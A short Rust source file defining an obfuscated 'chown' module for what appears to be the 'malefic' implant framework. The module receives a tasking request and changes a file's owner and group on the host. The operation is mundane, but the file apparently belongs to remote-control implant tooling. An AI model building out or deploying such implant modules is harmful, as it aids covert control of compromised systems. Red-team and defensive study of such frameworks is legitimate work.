use crate::prelude::*;

pub struct Chown {}

#[async_trait]
#[module_impl("chown")]
impl Module for Chown {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for Chown {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        _sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::ChownRequest)?;

        // Check if uid and gid exist, and try to parse them as Uid and Gid
        let uid = check_field!(request.uid)?.parse::<u32>()?;
        let gid = check_field!(request.gid)?.parse::<u32>()?;
        let path = check_field!(request.path)?;

        malefic_sysinfo::filesys::chown(&path, uid, gid)?;

        Ok(TaskResult::new(id))
    }
}
